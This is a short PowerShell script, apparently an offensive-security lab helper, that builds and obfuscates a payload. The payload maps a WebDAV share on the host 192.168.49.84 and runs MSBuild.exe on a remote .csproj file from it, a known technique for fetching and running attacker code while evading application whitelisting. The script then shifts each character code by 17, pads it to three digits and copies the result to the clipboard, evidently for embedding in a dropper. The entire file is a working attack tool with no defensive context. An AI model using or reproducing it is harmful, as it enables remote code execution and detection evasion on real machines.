$payload = "cmd /c net use /delete z: & net use z: http://192.168.49.84/webdav && c:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\192.168.49.84\webdav\msbuild.csproj"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
